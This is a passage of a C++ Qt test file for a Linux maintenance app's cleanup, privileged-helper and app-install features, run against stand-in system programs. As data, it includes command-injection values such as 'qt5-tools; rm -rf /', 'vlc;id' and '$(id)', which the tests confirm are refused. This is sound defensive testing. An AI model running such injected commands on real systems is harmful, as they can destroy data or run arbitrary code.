// SPDX-License-Identifier: GPL-2.0-or-later
//
// The upkeep cards past the Update card, read from what the computer's own
// programs print, and run with scripts of the test's own or with stand-ins for
// the system's programs on the PATH: nothing here looks at or changes this
// computer. Files are made and removed only inside the test's own home.
#include "app/AppInstall.h"
#include "app/CommunityApps.h"
#include "app/Helpers.h"
#include "app/HealthCheck.h"
#include "app/RecentChanges.h"
#include "app/RestorePoints.h"
#include "app/SettingRows.h"
#include "app/SpaceCleanup.h"
#include "app/TidyUp.h"
#include "settings/SettingsHistory.h"

#include <QDir>
#include <QFile>
#include <QProcess>
#include <QRegularExpression>
#include <QSettings>
#include <QSignalSpy>
#include <QStandardPaths>
#include <QScopeGuard>
#include <QTemporaryDir>
#include <QTest>

#include "AdminStandIn.h"

#include <algorithm>
#include <QTimeZone>

using namespace splitrock;

namespace {

QString fixture(const QString &name)
{
    QFile file(QStringLiteral(FIXTURES_DIR "/chores/") + name);
    return file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
}

const QDateTime Now = QDateTime(QDate(2026, 10, 9), QTime(21, 0), QTimeZone::utc());

// A script that prints a fixture.
QString printing(const QString &name)
{
    return QStringLiteral("cat '" FIXTURES_DIR "/chores/") + name + QLatin1Char('\'');
}

bool write(const QString &path, const QString &text, bool executable = false)
{
    QDir().mkpath(QFileInfo(path).absolutePath());
    QFile file(path);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Truncate))
        return false;
    file.write(text.toUtf8());
    file.close();
    if (executable)
        file.setPermissions(file.permissions() | QFileDevice::ExeOwner);
    return true;
}

// Stand-ins for the system's programs, first on the PATH while the test runs.
class StandIns
{
public:
    StandIns()
        : m_path(qEnvironmentVariable("PATH"))
    {
        qputenv("PATH", (m_dir.path() + QLatin1Char(':') + m_path).toLocal8Bit());
    }
    ~StandIns() { qputenv("PATH", m_path.toLocal8Bit()); }
    bool add(const QString &name, const QString &script)
    {
        return write(m_dir.filePath(name), QStringLiteral("#!/bin/sh\n") + script, true);
    }
    QString path() const { return m_dir.path(); }

private:
    QTemporaryDir m_dir;
    QString m_path;
};

bool git(const QString &dir, const QStringList &arguments)
{
    QProcess p;
    p.setWorkingDirectory(dir);
    p.start(QStringLiteral("git"), QStringList{QStringLiteral("-c"), QStringLiteral("user.name=Test"), QStringLiteral("-c"),
                                               QStringLiteral("user.email=test@example.invalid"), QStringLiteral("-c"),
                                               QStringLiteral("init.defaultBranch=master")}
                                       + arguments);
    return p.waitForFinished(20000) && p.exitStatus() == QProcess::NormalExit && p.exitCode() == 0;
}

QString gitOut(const QString &dir, const QStringList &arguments)
{
    QProcess p;
    p.setWorkingDirectory(dir);
    p.start(QStringLiteral("git"), arguments);
    p.waitForFinished(20000);
    return QString::fromUtf8(p.readAllStandardOutput()).trimmed();
}

QString srcinfo(const QString &version)
{
    return QStringLiteral("pkgbase = demo\n\tpkgver = %1\n\tpkgrel = 1\n\tsource = https://example.org/demo-%1.tar.gz\n"
                          "pkgname = demo\n").arg(version);
}

} // namespace

class TestChores : public QObject
{
    Q_OBJECT

private Q_SLOTS:
    void initTestCase()
    {
        // Only ever the test's own home.
        QVERIFY(!qEnvironmentVariable("SPLIT_ROCK_TEST_HOME").isEmpty());
        QCOMPARE(QDir::homePath(), qEnvironmentVariable("SPLIT_ROCK_TEST_HOME"));
    }

    void sizesAreReadAndSaid()
    {
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("take up 1.5G in the file system.")), qint64(1.5 * 1024 * 1024));
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("412.5 MiB")), qint64(412.5 * 1024));
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("nothing")), qint64(-1));
        QCOMPARE(Chore::size(3 * 1024 * 1024 + 300 * 1024), QStringLiteral("3.3 GB"));
        QCOMPARE(Chore::size(500 * 1024), QStringLiteral("500 MB"));
    }

    void spaceListsLeftoversBiggestFirst()
    {
        const SpaceCleanup::Look look = SpaceCleanup::readLook(fixture(QStringLiteral("space-look.txt"))
                                                               + fixture(QStringLiteral("space-unused.txt")));
        QCOMPARE(look.freeKb, qint64(48000000));
        QStringList ids;
        for (const SpaceCleanup::Item &item : look.items)
            ids.append(item.id);
        QCOMPARE(ids, (QStringList{QStringLiteral("pkgcache"), QStringLiteral("journal"), QStringLiteral("cache"),
                                   QStringLiteral("builds"), QStringLiteral("trash"), QStringLiteral("crashes"),
                                   QStringLiteral("orphans"), QStringLiteral("apps")}));
        const auto item = [&look](const QString &id) {
            return *std::find_if(look.items.cbegin(), look.items.cend(), [&id](const auto &i) { return i.id == id; });
        };
        // The copy of the version installed now is never counted.
        QCOMPARE(item(QStringLiteral("pkgcache")).count, 46);
        // 200 MB of logs stay.
        QCOMPARE(item(QStringLiteral("journal")).kb, qint64(1.4 * 1024 * 1024) - 200 * 1024);
        // Parts nothing uses and the trash wait for the person to pick them.
        QVERIFY(!item(QStringLiteral("orphans")).chosen);
        QCOMPARE(item(QStringLiteral("orphans")).list, (QStringList{QStringLiteral("python-pip"), QStringLiteral("qt5-tools")}));
        QVERIFY(!item(QStringLiteral("trash")).chosen);
        QCOMPARE(item(QStringLiteral("trash")).count, 3);
        QCOMPARE(item(QStringLiteral("apps")).list,
                 (QStringList{QStringLiteral("org.kde.Platform"), QStringLiteral("org.freedesktop.Platform")}));
        // Every row says exactly what is in it.
        QCOMPARE(item(QStringLiteral("pkgcache")).list,
                 (QStringList{QStringLiteral("firefox 131.0-1 · 70 MB"), QStringLiteral("kadunce 20261031.r394-1 · 2 MB"),
                              QStringLiteral("lib32-gcc-libs 14.2.1+r134+gab884fffe3fc-1"),
                              QStringLiteral("man-pages 6.19-1 · 6 MB")}));
        // By the names people know: a launcher's, or one known; the rest are
        // the system's own parts, in one line that opens to the full list.
        QStringList entries;
        for (const QVariant &entry : item(QStringLiteral("pkgcache")).entries) {
            const QVariantMap e = entry.toMap();
            entries.append(QStringList{e.value(QStringLiteral("name")).toString(), e.value(QStringLiteral("note")).toString(),
                                       e.value(QStringLiteral("size")).toString(), e.value(QStringLiteral("parts")).toString()}
                               .join(QLatin1Char('|')));
        }
        QCOMPARE(entries, (QStringList{QStringLiteral("Firefox|an older copy|70 MB|"),
                                       QStringLiteral("Manual pages|an older copy|6 MB|"),
                                       QStringLiteral("Kadunce|an older copy|2 MB|"),
                                       QStringLiteral("System parts|1 item||lib32-gcc-libs 14.2.1+r134+gab884fffe3fc-1")}));
        // The oldest finished logs go until the most recent 200 MB is left.
        QCOMPARE(item(QStringLiteral("journal")).list.size(), 2);
        QVERIFY2(item(QStringLiteral("journal")).list.first().startsWith(QStringLiteral("System log · 700 MB · ")),
                 qPrintable(item(QStringLiteral("journal")).list.join(QLatin1Char('|'))));
        QVERIFY(item(QStringLiteral("journal")).list.at(1).startsWith(QStringLiteral("Your apps' log · 600 MB · ")));
        QCOMPARE(item(QStringLiteral("crashes")).list.size(), 2);
        QVERIFY(item(QStringLiteral("crashes")).list.first().startsWith(QStringLiteral("kwin_wayland · 100 MB · ")));
        QVERIFY(item(QStringLiteral("crashes")).list.at(1).startsWith(QStringLiteral("plasma-browser · 50 MB · ")));
        QCOMPARE(item(QStringLiteral("cache")).list,
                 (QStringList{QStringLiteral("mozilla · 572 MB"), QStringLiteral("spotify · 128 MB")}));
        QCOMPARE(item(QStringLiteral("builds")).list, QStringList{QStringLiteral("~/.cache/paru/clone · 512 MB")});
        QCOMPARE(item(QStringLiteral("trash")).list,
                 (QStringList{QStringLiteral("Holiday photos · 195 MB"), QStringLiteral("notes.txt · 4 MB"),
                              QStringLiteral("old draft.odt · 800 KB")}));
        for (const SpaceCleanup::Item &each : look.items)
            QVERIFY2(!each.list.isEmpty(), qPrintable(each.id));
        QVERIFY(item(QStringLiteral("pkgcache")).admin);
        QVERIFY(!item(QStringLiteral("cache")).admin);

        // A name that isn't a package's is never offered.
        QString look2 = fixture(QStringLiteral("space-look.txt")) + fixture(QStringLiteral("space-unused.txt"));
        look2.replace(QStringLiteral("qt5-tools"), QStringLiteral("qt5-tools; rm -rf /"));
        const SpaceCleanup::Look odd = SpaceCleanup::readLook(look2);
        const auto orphans = std::find_if(odd.items.cbegin(), odd.items.cend(), [](const auto &i) { return i.id == QLatin1String("orphans"); });
        QCOMPARE(orphans->list, QStringList{QStringLiteral("python-pip")});
    }

    // The real look, in the test's own home: the trash lists what is in it.
    void theTrashSaysWhatItHolds()
    {
        const QString trash = QDir::homePath() + QStringLiteral("/.local/share/Trash");
        QDir(trash).removeRecursively();
        QVERIFY(write(trash + QStringLiteral("/files/Holiday photos/beach.jpg"), QString(5000, QLatin1Char('x'))));
        QVERIFY(write(trash + QStringLiteral("/files/notes.txt"), QStringLiteral("notes")));
        QVERIFY(write(trash + QStringLiteral("/files/.hidden"), QStringLiteral("h")));
        QVERIFY(write(trash + QStringLiteral("/info/notes.txt.trashinfo"), QStringLiteral("[Trash Info]\n")));
        SpaceCleanup space;
        space.setElevate({});
        space.setAdmin({QStringLiteral("false")});
        space.setYoursScript(QStringLiteral("true"));
        space.check();
        QTRY_VERIFY_WITH_TIMEOUT(space.stage() == QLatin1String("ready") || space.stage() == QLatin1String("nothing"), 60000);
        const QList<SpaceCleanup::Item> items = space.items();
        const auto it = std::find_if(items.cbegin(), items.cend(), [](const auto &i) { return i.id == QLatin1String("trash"); });
        QVERIFY(it != items.cend());
        QCOMPARE(it->count, 3);
        QCOMPARE(it->list.size(), 3);
        QVERIFY2(it->list.first().startsWith(QStringLiteral("Holiday photos · ")), qPrintable(it->list.join(QLatin1Char('|'))));
        QVERIFY(it->list.at(1).startsWith(QStringLiteral("notes.txt · ")));
        QDir(trash).removeRecursively();
    }

    void spaceClearsWhatIsChosen()
    {
        // Old and new cache files in the test's own home.
        const QString cache = QDir::homePath() + QStringLiteral("/.cache");
        QVERIFY(write(cache + QStringLiteral("/someapp/old.bin"), QStringLiteral("old")));
        QVERIFY(write(cache + QStringLiteral("/someapp/new.bin"), QStringLiteral("new")));
        QVERIFY(write(cache + QStringLiteral("/paru/clone/demo/PKGBUILD"), QStringLiteral("x")));
        QVERIFY(QProcess::execute(QStringLiteral("touch"), {QStringLiteral("-a"), QStringLiteral("-d"), QStringLiteral("40 days ago"),
                                                           cache + QStringLiteral("/someapp/old.bin")}) == 0);

        // The administrator's real job, with what it runs stood in for.
        StandIns standIns;
        // Two old copies, one of them the version installed now.
        QTemporaryDir pkgcache;
        const QString old = pkgcache.filePath(QStringLiteral("firefox-131.0-1-x86_64.pkg.tar.zst"));
        const QString inUse = pkgcache.filePath(QStringLiteral("kadunce-20261101.r409-1-x86_64.pkg.tar.zst"));
        QVERIFY(write(old, QStringLiteral("x")) && write(old + QStringLiteral(".sig"), QStringLiteral("s")));
        QVERIFY(write(inUse, QStringLiteral("x")));
        qputenv("SPLIT_ROCK_ADMIN_PKGCACHE", pkgcache.path().toUtf8());
        QVERIFY(standIns.add(QStringLiteral("paccache"), QStringLiteral(
            "case $1 in -dvk1) echo '==> candidate packages:'; echo '%1'; echo '%2' ;; esac\n").arg(old, inUse)));
        QVERIFY(standIns.add(QStringLiteral("snapper"), QStringLiteral("exit 1\n")));
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "case $1 in -Qdtq) echo python-pip ;; -Q) echo 'kadunce 20261101.r409-1' ;; *) echo \"pacman $*\" ;; esac\n")));
        SpaceCleanup space;
        space.setElevate({});
        space.setAdmin(adminInSource());
        space.setLookScript(printing(QStringLiteral("space-look.txt")));
        space.setYoursScript(printing(QStringLiteral("yours-look.txt")));
        space.setFreeScript(QStringLiteral("echo 49048576"));
        QStringList written;
        space.setWriteDown([&written](const QString &id, const QString &title, const QString &undo, QString *) {
            written << id << title << undo;
            return true;
        });
        bool reported = false;
        space.setReport([&reported](const QString &, bool ok, const QString &, const QString &) { reported = ok; });

        space.check();
        QTRY_COMPARE(space.stage(), QStringLiteral("ready"));
        QVERIFY(space.needsPassword());
        // How much room the apps the person added take, for Your apps' row;
        // never one of the things cleared.
        QCOMPARE(space.yoursKb(), qint64(13997976));
        QCOMPARE(space.yoursSize(), QStringLiteral("13 GB"));
        // Only the person's own and the old copies; nothing of the real
        // computer's runs as the test.
        space.choose(QStringLiteral("journal"), false);
        space.choose(QStringLiteral("crashes"), false);
        space.choose(QStringLiteral("apps"), false);
        space.choose(QStringLiteral("orphans"), true);
        // Where restore points can't be counted with no password, none are
        // offered.
        const QList<SpaceCleanup::Item> items = space.items();
        QVERIFY(std::none_of(items.cbegin(), items.cend(),
                             [](const SpaceCleanup::Item &i) { return i.id == QLatin1String("restores"); }));
        space.start();
        QCOMPARE(space.stage(), QStringLiteral("clearing"));
        space.close();
        QCOMPARE(space.stage(), QStringLiteral("clearing"));
        QTRY_COMPARE(space.stage(), QStringLiteral("done"));
        QVERIFY(reported);
        QCOMPARE(space.freed(), QStringLiteral("1.0 GB"));
        QVERIFY(written.value(1).startsWith(QStringLiteral("Freed up space: ")));
        QVERIFY(written.value(2).contains(QStringLiteral("python-pip")));
        // The jobs, then of the parts the person saw only those still unused.
        // Old copies go, with their signatures; the copy of the version
        // installed now stays.
        QVERIFY2(space.log().contains(QStringLiteral("removed firefox-131.0-1-x86_64.pkg.tar.zst")), qPrintable(space.log()));
        QVERIFY(!QFile::exists(old) && !QFile::exists(old + QStringLiteral(".sig")));
        QVERIFY(QFile::exists(inUse));
        qunsetenv("SPLIT_ROCK_ADMIN_PKGCACHE");
        QVERIFY2(space.log().contains(QStringLiteral("pacman -Rn --noconfirm --noprogressbar --color never -- python-pip\n")),
                 qPrintable(space.log()));
        // Unused for a month goes; the rest, and community build files kept
        // until chosen, stay.
        QVERIFY(!QFile::exists(cache + QStringLiteral("/someapp/old.bin")));
        QVERIFY(QFile::exists(cache + QStringLiteral("/someapp/new.bin")));
        QVERIFY(!QFile::exists(cache + QStringLiteral("/paru/clone")));
        QDir(cache).removeRecursively();
    }

    // The administrator's jobs take only their checked arguments: anything
    // else is refused before a thing runs.
    void theAdministratorTakesOnlyItsNamedJobs()
    {
        StandIns standIns;
        const QString ran = standIns.path() + QStringLiteral("/ran");
        for (const char *tool : {"pacman", "snapper", "paccache", "journalctl", "find", "makepkg", "git", "systemctl", "flatpak", "sleep"})
            QVERIFY(standIns.add(QString::fromLatin1(tool), QStringLiteral("echo \"$0 $*\" >> '%1'\n").arg(ran)));
        QTemporaryDir logs;
        const auto job = [&logs](const QStringList &arguments) {
            QProcess p;
            QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
            env.insert(QStringLiteral("SPLIT_ROCK_ADMIN_LOGS"), logs.path());
            p.setProcessEnvironment(env);
            p.start(adminInSource().first(), arguments);
            p.closeWriteChannel();
            if (!p.waitForFinished(20000))
                return -1;
            return p.exitCode();
        };
        const QString name = QStringLiteral("Split Rock");
        const QString head = QStringLiteral("0123456789abcdef0123456789abcdef01234567");
        const QList<QStringList> refused{
            {},
            {QStringLiteral("sh"), QStringLiteral("-c"), QStringLiteral("id")},
            {QStringLiteral("update")},
            {QStringLiteral("update"), name, QStringLiteral("2")},
            {QStringLiteral("update"), QStringLiteral("Anyone"), QStringLiteral("1")},
            {QStringLiteral("update"), name, QStringLiteral("1"), QStringLiteral("--overwrite=*")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("--config=/tmp/x")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("vlc;id")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("vlc id")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("vlc\nid")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("VLC")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("$(id)")},
            {QStringLiteral("install"), name, QStringLiteral("1"), QStringLiteral("vlc"), QStringLiteral("gimp")},
            {QStringLiteral("remove"), name, QStringLiteral("1"), QStringLiteral(".hidden")},
            // What the system runs on is never removed, asked for directly.
            {QStringLiteral("remove"), name, QStringLiteral("1"), QStringLiteral("konsole")},
            {QStringLiteral("remove"), name, QStringLiteral("1"), QStringLiteral("plasma-workspace")},
            {QStringLiteral("kept")},
            {QStringLiteral("kept"), QStringLiteral("vlc;id")},
            {QStringLiteral("free-space"), name, QStringLiteral("1"), QStringLiteral("everything")},
            {QStringLiteral("free-space"), name, QStringLiteral("1"), QStringLiteral("--"), QStringLiteral("-dd")},
            {QStringLiteral("unused"), QStringLiteral("cmake")},
            {QStringLiteral("restore-list"), QStringLiteral("now")},
            {QStringLiteral("restore-undo"), QStringLiteral("8"), QStringLiteral("7")},
            {QStringLiteral("restore-undo"), QStringLiteral("0"), QStringLiteral("7")},
            {QStringLiteral("restore-undo"), QStringLiteral("1"), QStringLiteral("2..9")},
            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), QStringLiteral("abc"), QStringLiteral("--"),
             QStringLiteral("demo")},
            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path() + QStringLiteral("/../x"), head,
             QStringLiteral("--"), QStringLiteral("demo")},
            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), head, QStringLiteral("--")},
            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), head, QStringLiteral("x;y"),
             QStringLiteral("--"), QStringLiteral("demo")},
            {QStringLiteral("start-service")},
            {QStringLiteral("start-service"), QStringLiteral("bluetooth")},
            {QStringLiteral("start-service"), QStringLiteral("--all")},
            {QStringLiteral("start-service"), QStringLiteral("-x.service")},
            {QStringLiteral("start-service"), QStringLiteral("x;id.service")},
            {QStringLiteral("start-service"), QStringLiteral("a.service"), QStringLiteral("b.service")},
            {QStringLiteral("flatpak-back"), QStringLiteral("org.mozilla.firefox")},
            {QStringLiteral("flatpak-back"), QStringLiteral("org.mozilla.firefox"), QStringLiteral("abc")},
            {QStringLiteral("flatpak-back"), QStringLiteral("org.mozilla.firefox"), head},
            {QStringLiteral("flatpak-back"), QStringLiteral("--system"), head + head.left(24)},
            {QStringLiteral("flatpak-back"), QStringLiteral("firefox"), head + head.left(24)},
            {QStringLiteral("flatpak-back"), QStringLiteral("org..x.y"), head + head.left(24)},
            {QStringLiteral("appstore")},
            {QStringLiteral("appstore"), name},
            {QStringLiteral("appstore"), name, QStringLiteral("2")},
            {QStringLiteral("appstore"), QStringLiteral("Anyone"), QStringLiteral("1")},
            {QStringLiteral("appstore"), name, QStringLiteral("1"), QStringLiteral("vlc")},
        };
        for (const QStringList &arguments : refused)
            QVERIFY2(job(arguments) == 2, qPrintable(arguments.join(QLatin1Char('|'))));
        QVERIFY2(!QFile::exists(ran), qPrintable(QStringLiteral("something ran")));

        // The ones it was made for do run.
        QCOMPARE(job({QStringLiteral("install"), name, QStringLiteral("0"), QStringLiteral("lib32-gcc-libs")}), 0);
        QCOMPARE(job({QStringLiteral("restore-undo"), QStringLiteral("7"), QStringLiteral("8")}), 0);
        QCOMPARE(job({QStringLiteral("start-service"), QStringLiteral("bluetooth.service")}), 0);
        QCOMPARE(job({QStringLiteral("flatpak-back"), QStringLiteral("org.mozilla.firefox"), head + head.left(24)}), 0);
        QFile file(ran);
        QVERIFY(file.open(QIODevice::ReadOnly));
        const QString said = QString::fromUtf8(file.readAll());
        QVERIFY2(said.contains(QStringLiteral("pacman -S --needed --noconfirm --noprogressbar --color never -- lib32-gcc-libs")),
                 qPrintable(said));
        QVERIFY(said.contains(QStringLiteral("snapper -c root undochange 7..8")));
        QVERIFY2(said.contains(QStringLiteral("systemctl is-failed --quiet -- bluetooth.service")), qPrintable(said));
        QVERIFY(said.contains(QStringLiteral("systemctl restart -- bluetooth.service")));
        QVERIFY(said.contains(QStringLiteral("flatpak update --system -y --noninteractive --commit=%1 -- org.mozilla.firefox")
                                  .arg(head + head.left(24))));
    }

    // What building software needs is never a part nothing uses: not listed,
    // and not removed even when named; and what is removed goes by name,
    // with nothing else alongside.
    void buildToolsAreNeverUnused()
    {
        StandIns standIns;
        const QString ran = standIns.path() + QStringLiteral("/ran");
        QVERIFY(standIns.add(QStringLiteral("snapper"), QStringLiteral("exit 1\n")));
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "case $1 in\n"
            "-Qdtq) printf '%s\\n' cmake extra-cmake-modules vulkan-headers wayland-protocols opencv qt5-tools electron ;;\n"
            "-Qlq) case $3 in\n"
            "    opencv) echo /usr/include/opencv4/opencv2/core.hpp ;;\n"
            "    qt5-tools) echo /usr/lib/cmake/Qt5Help/Qt5HelpConfig.cmake ;;\n"
            "    electron) echo /usr/lib/electron/electron ;;\n"
            "    esac ;;\n"
            "-Qi) shift; for p in \"$@\"; do echo 'Installed Size  : 300.00 MiB'; done ;;\n"
            "*) echo \"pacman $*\" >> '%1' ;;\n"
            "esac\n").arg(ran)));
        const auto job = [](const QStringList &arguments, QString *output) {
            QProcess p;
            p.setProcessChannelMode(QProcess::MergedChannels);
            p.start(adminInSource().first(), arguments);
            p.closeWriteChannel();
            if (!p.waitForFinished(20000))
                return -1;
            *output = QString::fromUtf8(p.readAll());
            return p.exitCode();
        };
        QString output;
        QCOMPARE(job({QStringLiteral("unused")}, &output), 0);
        const SpaceCleanup::Look look = SpaceCleanup::readLook(output);
        QCOMPARE(look.items.size(), 1);
        QCOMPARE(look.items.first().list, QStringList{QStringLiteral("electron")});
        QCOMPARE(look.items.first().kb, qint64(300 * 1024));

        QCOMPARE(job({QStringLiteral("free-space"), QStringLiteral("Split Rock"), QStringLiteral("1"), QStringLiteral("--"),
                      QStringLiteral("cmake"), QStringLiteral("opencv"), QStringLiteral("electron"), QStringLiteral("vulkan-headers")},
                     &output),
                 0);
        QFile file(ran);
        QVERIFY(file.open(QIODevice::ReadOnly));
        QCOMPARE(QString::fromUtf8(file.readAll()), QStringLiteral("pacman -Rn --noconfirm --noprogressbar --color never -- electron\n"));
        QVERIFY2(output.contains(QStringLiteral("split-rock-removed= electron")), qPrintable(output));
    }

    void installFindsAppsBestFirst()
    {
        const QList<AppInstall::App> apps = AppInstall::readSearch(fixture(QStringLiteral("install-search.txt")),
                                                                   QStringLiteral("pdf editor"));
        QStringList keys;
        for (const AppInstall::App &a : apps)
            keys.append(a.key);
        // The library is no app; Okular is on the shelf, so Flathub's copy
        // isn't listed again.
        QCOMPARE(keys, (QStringList{QStringLiteral("flathub:net.code_industry.MasterPDFEditor"), QStringLiteral("shelf:pdfarranger"),
                                    QStringLiteral("shelf:okular"), QStringLiteral("flathub:com.github.xournalpp.xournalpp")}));
        QVERIFY(apps.at(2).installed);
        QVERIFY(apps.at(2).alsoFlathub);
        QVERIFY(!apps.at(1).installed);
    }

    // An app installed already is named as its launcher names it, not by its
    // package; one made for GNOME goes after the rest, unless GNOME is asked
    // for; each comes with the names its icon goes by.
    void installNamesAppsAsPeopleKnowThem()
    {
        const QString output = QStringLiteral(
            "@@ shelf\n"
            "Identifier: org.gnome.Kooha.desktop [desktop-application]\nName: Kooha Screen Recorder\n"
            "Summary: Screen recorder for GNOME\nPackage: kooha\nIcon: kooha_io.github.seadve.Kooha.png\n---\n"
            "Identifier: simplescreenrecorder [desktop-application]\nName: SimpleScreenRecorder\n"
            "Summary: A feature-rich screen recorder\nPackage: simplescreenrecorder\n---\n"
            "@@ flathub\n"
            "com.dec05eba.gpu_screen_recorder\tGPU Screen Recorder\tRecord your screen with almost no slowdown\tflathub\n"
            "@@ installed\ncachyos-packageinstaller\n"
            "@@ owned\ncachyos-packageinstaller\n"
            "@@ menu\norg.cachyos.packageinstaller.desktop\tPackage Installer for screen recorder apps\tpackage-installer\n"
            "@@ owners\n/usr/share/applications/org.cachyos.packageinstaller.desktop is owned by cachyos-packageinstaller 1.0-1\n"
            "@@ local\n@@ end\n");
        const QList<AppInstall::App> apps = AppInstall::readSearch(output, QStringLiteral("screen recorder"));
        QStringList names;
        for (const AppInstall::App &a : apps)
            names.append(a.name);
        QCOMPARE(names, (QStringList{QStringLiteral("SimpleScreenRecorder"), QStringLiteral("GPU Screen Recorder"),
                                     QStringLiteral("Package Installer for screen recorder apps"), QStringLiteral("Kooha Screen Recorder")}));
        QCOMPARE(apps.at(2).icons, (QStringList{QStringLiteral("package-installer"), QStringLiteral("org.cachyos.packageinstaller"),
                                                QStringLiteral("cachyos-packageinstaller")}));
        QCOMPARE(apps.at(3).icons, (QStringList{QStringLiteral("kooha_io.github.seadve.Kooha.png"), QStringLiteral("org.gnome.Kooha"),
                                                QStringLiteral("kooha")}));
        QCOMPARE(apps.at(1).icons, QStringList{QStringLiteral("com.dec05eba.gpu_screen_recorder")});
        QVERIFY(AppInstall::madeForGnome(apps.at(3)));
        // Asked for by GNOME's name, it isn't put last.
        QCOMPARE(AppInstall::readSearch(output, QStringLiteral("gnome screen recorder")).first().name,
                 QStringLiteral("Kooha Screen Recorder"));
    }

    // A package asked for by its exact name, such as the engine Ask runs its
    // model with, is found though no app description lists it.
    void installFindsAPackageByItsName()
    {
        const QString output = QStringLiteral("@@ shelf\nIdentifier: llama-cpp\nName: llama-cpp\n"
                                              "Summary: Port of LLaMA in C/C++\nPackage: llama-cpp\n---\n"
                                              "@@ flathub\n@@ installed\n@@ owned\n@@ end\n");
        const QList<AppInstall::App> apps = AppInstall::readSearch(output, QStringLiteral("llama.cpp"));
        QCOMPARE(apps.size(), 1);
        QCOMPARE(apps.first().key, QStringLiteral("shelf:llama-cpp"));
        QVERIFY(!apps.first().installed);
    }

    void theAppStoreIsAddedThroughTheTransaction()
    {
        // The real transaction, with pacman and flatpak stood in for.
        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "echo \"pacman $*\"\necho 'Packages (2) discover-6.5-1 flatpak-1.16-1'\necho 'installing discover...'\n")));
        QVERIFY(standIns.add(QStringLiteral("flatpak"), QStringLiteral("echo \"flatpak $*\"\n")));
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setAdmin(adminInSource());
        install.setLogFolder(logs.path());
        bool missing = true;
        install.setStoreProbe([&missing] { return missing; });
        QString title;
        install.setWriteDown([&title](const QString &, const QString &t, const QString &, QString *) {
            title = t;
            return true;
        });
        // A search without the app store offers it.
        install.setSearchScript(printing(QStringLiteral("install-search.txt")));
        install.search(QStringLiteral("pdf"));
        QTRY_COMPARE(install.stage(), QStringLiteral("results"));
        QVERIFY(install.storeMissing());
        QVERIFY(!install.store());
        install.askStore();
        QCOMPARE(install.stage(), QStringLiteral("store"));
        QVERIFY(install.store());
        install.addStore();
        QCOMPARE(install.stage(), QStringLiteral("adding"));
        QVERIFY(install.busy());
        missing = false;
        QTRY_COMPARE(install.stage(), QStringLiteral("added"));
        QCOMPARE(title, QStringLiteral("Added the app store"));
        QVERIFY(install.log().contains(QStringLiteral("pacman -S --needed --noconfirm --noprogressbar --color never -- discover flatpak")));
        QVERIFY(install.log().contains(QStringLiteral("flatpak remote-add --system --if-not-exists flathub")));
        QVERIFY(!install.storeMissing());
        // Where it is here already, the card says so and adds nothing.
        install.askStore();
        QCOMPARE(install.stage(), QStringLiteral("store"));
        install.addStore();
        QCOMPARE(install.stage(), QStringLiteral("store"));
        // Another way in leaves Add the app store.
        install.ask();
        QVERIFY(!install.store());
    }

    void installRunsThroughTheTransaction()
    {
        // The real transaction, with pacman stood in for.
        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "echo \"pacman $*\"\necho 'Packages (1) pdfarranger-1.11-1'\necho 'installing pdfarranger...'\n"
            "echo ':: Running post-transaction hooks...'\n")));
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setAdmin(adminInSource());
        install.setLogFolder(logs.path());
        install.setSearchScript(printing(QStringLiteral("install-search.txt")));
        QString title;
        install.setWriteDown([&title](const QString &, const QString &t, const QString &, QString *) {
            title = t;
            return true;
        });
        install.search(QStringLiteral("pdf"));
        QCOMPARE(install.stage(), QStringLiteral("searching"));
        QTRY_COMPARE(install.stage(), QStringLiteral("results"));
        // One already installed isn't installed again.
        install.install(QStringLiteral("shelf:okular"));
        QCOMPARE(install.stage(), QStringLiteral("results"));
        install.install(QStringLiteral("shelf:pdfarranger"));
        QCOMPARE(install.stage(), QStringLiteral("installing"));
        QTRY_COMPARE(install.stage(), QStringLiteral("done"));
        QCOMPARE(title, QStringLiteral("Installed PDF Arranger"));
        QVERIFY(install.log().contains(QStringLiteral("pacman -S --needed --noconfirm --noprogressbar --color never -- pdfarranger")));
        QVERIFY(install.pickedMap().value(QStringLiteral("installed")).toBool());
        QVERIFY(QFile::exists(logs.filePath(QStringLiteral("split-rock-install.log"))));
    }

    void theHelpersOwnNameIsNoSearch()
    {
        // Typing the Helper's name opens it asking; only words after it search.
        QCOMPARE(AppInstall::withoutInstallWords(QStringLiteral("install an app")), QString());
        QCOMPARE(AppInstall::withoutInstallWords(QStringLiteral("Install a new app")), QString());
        QCOMPARE(AppInstall::withoutInstallWords(QStringLiteral("install an app spotify")), QStringLiteral("spotify"));
        QCOMPARE(AppInstall::withoutInstallWords(QStringLiteral("install spotify")), QStringLiteral("spotify"));
        QCOMPARE(AppInstall::withoutInstallWords(QStringLiteral("add an app: Krita")), QStringLiteral("Krita"));
        // A name that only starts like one of those words stays whole.
        QCOMPARE(AppInstall::withoutInstallWords(QStringLiteral("address book")), QStringLiteral("address book"));
        QCOMPARE(AppInstall::withoutInstallWords(QStringLiteral("a pdf editor")), QStringLiteral("a pdf editor"));
        QCOMPARE(AppInstall::withoutInstallWords(QStringLiteral("getting things gnome")), QStringLiteral("getting things gnome"));
        AppInstall install;
        install.setElevate({});
        install.setSearchScript(QStringLiteral("echo searched"));
        install.setReport({});
        install.search(QStringLiteral("install an app"));
        QCOMPARE(install.stage(), QStringLiteral("asking"));
    }

